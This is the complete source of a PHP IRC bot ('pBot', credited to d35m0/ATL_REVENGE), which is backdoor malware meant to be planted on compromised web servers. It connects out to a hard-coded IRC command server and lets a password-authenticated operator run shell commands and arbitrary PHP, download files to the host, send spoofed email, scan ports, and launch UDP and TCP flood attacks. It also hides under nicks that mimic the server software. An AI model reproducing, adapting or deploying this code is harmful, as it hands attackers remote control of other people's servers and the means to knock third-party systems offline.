<?php

/******************************************************************** 
# Priv8 ~ Priv8 ~ Priv8                                            ##
# Edited: d35m0                                                    ##
# Only ATL_REVENGE                                                 ##
# Keep IT Priv8 ~ Keep IT Priv8                                    ##
# Read the source code, and understand how to use it ;)            ##
# Release 1.0                                                      ##
# We Are:      ATL_REVENGE Staff // d35m0 // Only Me               ##
#####################################################################
##          _____     ___________     __               _           ##
##         /  _  \    \___    ___/   |  |             | |          ##
##        /  /_\  \      |    |      |  |             | |          ##
##       /    |    \     |    |      |  |_____        |_|          ##
##       \____|___ /     |____|      |________|        _           ##
##                                                    |_|          ##
##                                                                 ##
##        __  _|_  |        __   ___        ___   __   __   ___    ##
##       (__(  |_, |_, ___ |  ' (__/_ (__| (__/_ |  ) (__| (__/_   ##
##                                                     __/         ##
##                       __   __   ___                             ##
##                      (___ |  ' (__/_ (__(__(                    ##
##                                                                 ##
#####################################################################
********************************************************************/

set_time_limit(0); 
error_reporting(0); 

class pBot 
{ 
var $config = array("server"=>"nojodas.sytes.net", 
                     "port"=>6667, 
                     "pass"=>"",
                     "prefix"=>"[UDP2]", 
                     "maxrand"=>2, 
                     "chan"=>"#puta", 
                     "key"=>"",
                     "modes"=>"+ixs", 
                     "password"=>"weputa",
                     "trigger"=>".", 
                     "hostauth"=>"Te.Caigo.Mal.Coje.Un.Turno.Toma.Asiento.Y.Espera.Que.Me.Importe"
                     ); 
 var $users = array(); 
 function start() 
 { 
    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) 
       $this->start(); 
    $ident = "ArEa51|"; 
    $alph = range("a","z"); 
    for($i=0;$i<$this->config['maxrand'];$i++) 
       $ident .= $alph[rand(0,25)]; 
    if(strlen($this->config['pass'])>0) 
       $this->send("PASS ".$this->config['pass']); 
    $this->send("USER $ident 127.0.0.1 localhost :$ident"); 
    $this->set_nick(); 
    $this->main(); 
 } 
 function main() 
 { 
    while(!feof($this->conn)) 
    { 
       $this->buf = trim(fgets($this->conn,512)); 
       $cmd = explode(" ",$this->buf); 
       if(substr($this->buf,0,6)=="PING :") 
       { 
          $this->send("PONG :".substr($this->buf,6)); 
       } 
       if(isset($cmd[1]) && $cmd[1] =="001") 
       { 
          $this->send("MODE ".$this->nick." ".$this->config['modes']); 
          $this->join($this->config['chan'],$this->config['key']); 
       } 
       if(isset($cmd[1]) && $cmd[1]=="433") 
       { 
          $this->set_nick(); 
       } 
       if($this->buf != $old_buf) 
       { 
          $mcmd = array(); 
          $msg = substr(strstr($this->buf," :"),2); 
          $msgcmd = explode(" ",$msg); 
          $nick = explode("!",$cmd[0]); 
          $vhost = explode("@",$nick[1]); 
          $vhost = $vhost[1]; 
          $nick = substr($nick[0],1); 
          $host = $cmd[0]; 
          if($msgcmd[0]==$this->nick) 
          { 
           for($i=0;$i<count($msgcmd);$i++) 
              $mcmd[$i] = $msgcmd[$i+1]; 
          } 
          else 
          { 
           for($i=0;$i<count($msgcmd);$i++) 
              $mcmd[$i] = $msgcmd[$i]; 
          } 
          if(count($cmd)>2) 
          { 
             switch($cmd[1]) 
             { 
                case "QUIT": 
                   if($this->is_logged_in($host)) 
                   { 
                      $this->log_out($host); 
                   } 
                break; 
                case "PART": 
                   if($this->is_logged_in($host)) 
                   { 
                      $this->log_out($host); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == "*")) 
                   { 
                      if(substr($mcmd[0],0,1)==".") 
                      { 
                         switch(substr($mcmd[0],1)) 
                         { 
                            case "user": 
                              if($mcmd[1]==$this->config['password']) 
                              { 
                                 $this->privmsg($this->config['chan'],"[\2Auth\2]: $nick logged in"); 
                                 $this->log_in($host); 
                              } 
                              else 
                              { 
                                 $this->privmsg($this->config['chan'],"[\2Auth\2]: Incorrect password from $nick"); 
                              } 
                            break; 
                         } 
                      } 
                   } 
                   elseif($this->is_logged_in($host)) 
                   { 
                      if(substr($mcmd[0],0,1)==".") 
                      { 
                         switch(substr($mcmd[0],1)) 
                         { 
                            case "restart": 
                               $this->send("QUIT :restart"); 
                               fclose($this->conn); 
                               $this->start(); 
                            break; 
                            case "mail": //mail to from subject message 
                               if(count($mcmd)>4) 
                               { 
                                  $header = "From: <".$mcmd[2].">"; 
                                  if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header)) 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2mail\2]: Unable to send"); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2mail\2]: Message sent to \2".$mcmd[1]."\2"); 
                                  } 
                               } 
                            break; 
							case "help": 
                               $this->privmsg($this->config['chan'],"[\2COMMANDS\2]"); 
							   $this->privmsg($this->config['chan'],"[+] [\2.url\2] Return the host of the shell [only for bottler Admin]"); 
							   $this->privmsg($this->config['chan'],"[+] [\2.dns host\2] return you the DNS resolved of the IP"); 
							   $this->privmsg($this->config['chan'],"[+] [\2.exec cmd\2] execute a cmd on the shell"); 
							   $this->privmsg($this->config['chan'],"[+] [\2.cmd cmd\2] same of .exec but with a different routine"); 
							   $this->privmsg($this->config['chan'],"[+] [\2.rename\2] Randomize the bottler nick"); 
							   $this->privmsg($this->config['chan'],"[+] [\2.my ACTION\2] Use the IRC protocol"); 
							   $this->privmsg($this->config['chan'],"[+] [\2.mail to from subject message\2] Send e-mail"); 
							   $this->privmsg($this->config['chan'],"[+] [\2.eval phpcode\2] Eval PHP code"); 
							   $this->privmsg($this->config['chan'],"[+] [\2.pscan host port\2] Port Scanner"); 
							   $this->privmsg($this->config['chan'],"[+] [\2.changeserver host port serverpass\2] Change Server [only for bottler Admin]"); 
							   $this->privmsg($this->config['chan'],"[+] [\2.download\2] Download a file to the shell"); 
							   $this->privmsg($this->config['chan'],"[+] [\2.udpflood host packetsize time\2] DDOS by UdpFlood "); 
							   $this->privmsg($this->config['chan'],"[+] [\2.tcpflood host packets packetsize port delay\2] DDOS by TcpFlood "); 
							   $this->privmsg($this->config['chan'],"[+] [\2.restart\2] Restart the bottler [only for bottler Admin]"); 
							   $this->privmsg($this->config['chan'],"[+] [\2.die\2] Kill the bottler [only for bottler Admin]");
							   $this->privmsg($this->config['chan'],"[+] [\2.ver\2] Return the bottler version"); 
							break;
                            case "dns": 
                               if(isset($mcmd[1])) 
                               { 
                                  $ip = explode(".",$mcmd[1]); 
                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1])); 
                                  } 
                               } 
                            break; 
                            case "url": 
                               $this->privmsg($this->config['chan'],"[\2URL\2]: [\2domain\2: ".$_SERVER['SERVER_NAME']."] [\2url\2:".$_SERVER['REQUEST_URI']."]"); 
                            break;
                            case "ver": 
                               $this->privmsg($this->config['chan'],"[\2Bot by d35m0 v2.0\2]"); 
                            break;
                            case "cmd": 
                               if(isset($mcmd[1])) 
                               { 
                                  $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                                  $this->privmsg($this->config['chan'],"[\2cmd\2]: $command"); 
                                  $pipe = popen($command,"r"); 
                                  while(!feof($pipe)) 
                                  { 
                                     $pbuf = trim(fgets($pipe,512)); 
                                     if($pbuf != NULL) 
                                        $this->privmsg($this->config['chan'],"     : $pbuf"); 
                                  } 
                                  pclose($pipe); 
                               } 
                            break; 
                            case "rename": 
                               $this->set_nick(); 
                            break; 
                            case "my": 
                               $this->send(strstr($msg,$mcmd[1])); 
                            break; 
                            case "php": 
                               $eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1]))); 
                            break; 
                            case "exec": 
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                               $exec = shell_exec($command); 
                               $ret = explode("\n",$exec); 
                               $this->privmsg($this->config['chan'],"[\2exec\2]: $command"); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config['chan'],"      : ".trim($ret[$i])); 
                            break; 
                            case "pscan":
                               if(count($mcmd) > 2) 
                               { 
                                  if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15)) 
                                     $this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2open\2"); 
                                  else 
                                     $this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2closed\2"); 
                               } 
                            break; 
                            case "changeserver":
                               if(count($mcmd)>2) 
                               { 
                                  $this->config['server'] = $mcmd[1]; 
                                  $this->config['port'] = $mcmd[2]; 
                                  if(isset($mcmcd[3])) 
                                  { 
                                   $this->config['pass'] = $mcmd[3]; 
                                   $this->privmsg($this->config['chan'],"[\2update\2]: Changed server to ".$mcmd[1].":".$mcmd[2]." Pass: ".$mcmd[3]); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2update\2]: Changed server to ".$mcmd[1].":".$mcmd[2]); 
                                  } 
                               } 
                            break; 
                            case "download": 
                               if(count($mcmd) > 2) 
                               { 
                                  if(!$fp = fopen($mcmd[2],"w")) 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2download\2]: Cannot download, permission denied."); 
                                  } 
                                  else 
                                  { 
                                     if(!$get = file($mcmd[1])) 
                                     { 
                                        $this->privmsg($this->config['chan'],"[\2download\2]: Unable to download from \2".$mcmd[1]."\2"); 
                                     } 
                                     else 
                                     { 
                                        for($i=0;$i<=count($get);$i++) 
                                        { 
                                           fwrite($fp,$get[$i]); 
                                        } 
                                        $this->privmsg($this->config['chan'],"[\2download\2]: File \2".$mcmd[1]."\2 downloaded to \2".$mcmd[2]."\2"); 
                                     } 
                                     fclose($fp); 
                                  } 
                               } 
                            break; 
                            case "die": 
                               $this->send("QUIT :die command from $nick"); 
                               fclose($this->conn); 
                               exit; 
                            case "logout": 
                               $this->log_out($host); 
                               $this->privmsg($this->config['chan'],"[\2auth\2]: $nick logged out"); 
                            break; 
                            case "udpflood": 
                               if(count($mcmd)>3) 
                               { 
                                  $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]); 
                               } 
                            break; 
                            case "tcpflood": 
                               if(count($mcmd)>5) 
                               { 
                                  $this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]); 
                               } 
                            break; 
                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $old_buf = $this->buf; 
    } 
    $this->start(); 
 } 
 function send($msg) 
 { 
    fwrite($this->conn,"$msg\r\n"); 

 } 
 function join($chan,$key=NULL) 
 { 
    $this->send("JOIN $chan $key"); 
 } 
 function privmsg($to,$msg) 
 { 
    $this->send("PRIVMSG $to :$msg"); 
 } 
 function is_logged_in($host) 
 { 
    if(isset($this->users[$host])) 
       return 1; 
    else 
       return 0; 
 } 
 function log_in($host) 
 { 
    $this->users[$host] = true; 
 } 
 function log_out($host) 
 { 
    unset($this->users[$host]); 
 } 
 function set_nick() 
 { 
    if(isset($_SERVER['SERVER_SOFTWARE'])) 
    { 
       if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"apache")) 
          $this->nick = "Apache"; 
       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"iis")) 
          $this->nick = "Iis"; 
       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"xitami")) 
          $this->nick = "Xitami"; 
       else 
          $this->nick = "Unknow"; 
    } 
    else 
    { 
       $this->nick = "[C]"; 
    } 
    $this->nick .= $this->config['prefix']; 
    for($i=0;$i<$this->config['maxrand'];$i++) 
       $this->nick .= mt_rand(0,9); 
    $this->send("NICK ".$this->nick); 
 } 
  function udpflood($host,$packetsize,$time) {
	$this->privmsg($this->config['chan'],"[\2UdpFlood Started!\2]"); 
	$packet = "";
	for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
	$timei = time();
	$i = 0;
	while(time()-$timei < $time) {
		$fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
      	fwrite($fp,$packet);
       	fclose($fp);
		$i++;
	}
	$env = $i * $packetsize;
	$env = $env / 1048576;
	$vel = $env / $time;
	$vel = round($vel);
	$env = round($env);
	$this->privmsg($this->config['chan'],"[\2UdpFlood Finished!\2]: $env MB sent / Media: $vel MB/s ");
}
 function tcpflood($host,$packets,$packetsize,$port,$delay) 
 { 
    $this->privmsg($this->config['chan'],"[\2TcpFlood Started!\2]"); 
    $packet = ""; 
    for($i=0;$i<$packetsize;$i++) 
       $packet .= chr(mt_rand(1,256)); 
    for($i=0;$i<$packets;$i++) 
    { 
       if(!$fp=fsockopen("tcp://".$host,$port,$e,$s,5)) 
       { 
          $this->privmsg($this->config['chan'],"[\2tcpflood\2]: Error: <$e>"); 
          return 0; 
       } 
       else 
       { 
          fwrite($fp,$packet); 
          fclose($fp); 
       } 
       sleep($delay); 
    } 
    $this->privmsg($this->config['chan'],"[\2TcpFlood Finished!\2]: Config - $packets packets to $host:$port."); 
 } 
} 

$bot = new pBot; 
$bot->start(); 

?>
